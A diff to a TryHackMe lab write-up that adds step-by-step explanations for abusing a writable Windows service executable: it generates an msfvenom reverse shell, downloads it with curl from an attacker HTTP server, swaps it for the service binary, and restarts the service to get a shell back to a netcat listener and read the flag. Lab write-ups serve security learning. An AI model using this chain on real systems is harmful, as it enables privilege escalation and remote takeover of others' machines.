@@ -225,6 +225,8 @@ THM{TASK_COMPLETED}
 
 ### Insecure Permissions on Service Executable
 
+1. Started this task's machine
+2. `sc qc <SERVICE>` from the compromised Windows machine to query our target service's query configuration options
 ```PowerShell
 C:\Users\thm-unpriv>sc qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
@@ -241,6 +243,7 @@ SERVICE_NAME: WindowsScheduler
         SERVICE_START_NAME : .\svcusr1
 ```
 
+3. `icacls <FILENAME>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target service's `BINARY_PATH_NAME` executable
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
@@ -253,6 +256,7 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
+4. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
 ```Bash
 root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -263,11 +267,13 @@ Final size of exe-service file: 48640 bytes
 Saved as: ReverseShell.exe
 ```
 
+5. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
 ```Bash
 root@ip-10-10-6-207:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
+6. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
 ```PowerShell
 C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -276,6 +282,12 @@ C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShel
 curl: (6) Could not resolve host: ReverseShell.exe
 ```
 
+7. `cd <BINARY_PATH_NAME LOCATION>` from the compromised Windows machine to change into the directory where the `BINARY_PATH_NAME` executable is located in
+```PowerShell
+C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1
+```
+
+8. `dir` from the compromised Windows machine to display all the files and directories that are in our current working directory to ensure that the payload was successfully downloaded, which it was
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>dir
  Volume in drive C has no label.
@@ -290,11 +302,13 @@ C:\PROGRA~2\SYSTEM~1>dir
                3 Dir(s)  14,788,710,400 bytes free
 ```
 
+9. `move <PAYLOAD> <FILENAME>` from the compromised Windows machine to rename our target service's `BINARY_PATH_NAME` into a backup file
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
         1 file(s) moved.
 ```
 
+9. `dir` from the compromised Windows machine to display the files and directories that are in our current working directory to ensure that the executable was renamed
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>dir
  Volume in drive C has no label.
@@ -309,11 +323,13 @@ C:\PROGRA~2\SYSTEM~1>dir
                3 Dir(s)  14,779,236,352 bytes free
 ```
 
+10. `move <PAYLOAD> <BINARY_PATH_NAME TARGET EXECUTABLE>` from the compromised Windows machine to move our previously downloaded reverse shell payload executable into our current working directory to replace the previous `BINARY_PATH_NAME` executable with our payload
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\ReverseShell.exe WService.exe
         1 file(s) moved.
 ```
 
+11. `dir` from the compromised Windows machine to list the files and directories that are in our current working directory to ensure that our payload was successfully transfered and renamed to match the `BINARY_PATH_NAME`'s executable, which it did
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>dir
  Volume in drive C has no label.
@@ -329,17 +345,20 @@ C:\PROGRA~2\SYSTEM~1>dir
                3 Dir(s)  14,755,926,016 bytes free
 ```
 
+12. `icacls <PAYLOAD> /grant EVERYONE:F` from the compromised Windows machine to grant full control (read and write permissions) to the "Everyone" group for our payload
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
 processed file: WService.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
+13. `nc -lvnp <PORT NUMBER>` from our attack machine to open up a netcat listener using the open port that we specified in our payload that'll listen for any inbound connection
 ```Bash
 root@ip-10-10-6-207:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
+14. `sc stop <SERVICE>` from the compromised Windows machine to stop our target service 
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>sc stop WindowsScheduler
 
@@ -355,6 +374,7 @@ SERVICE_NAME: WindowsScheduler
         FLAGS              :
 ```
 
+15. `sc start <SERVICE>` from the compromised Windows machine to start our target service once again but this time its going to execute our reverse shell payload that'll spawn in a reverse shell that'll connect back to our netcat listener on our attack machine
 ```PowerShell
 C:\PROGRA~2\SYSTEM~1>sc start WindowsScheduler
 
@@ -369,7 +389,6 @@ SERVICE_NAME: WindowsScheduler
         PID                : 3508
         FLAGS              :
 ```
-
 ```Bash
 Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.124.176 49783 received!
@@ -379,11 +398,14 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
+16. `type <FLAG LOCATION>` on our reverse shell to type out the contents of the file containing this task's flag onto our terminal
 ```PowerShell
 C:\Windows\system32>type C:\Users\svcusr1\Desktop\flag.txt     
 type C:\Users\svcusr1\Desktop\flag.txt
 THM{AT_YOUR_SERVICE}
 ```
+
+**TASK COMPLETED!**
 
 ### Unquoted Service Paths
 
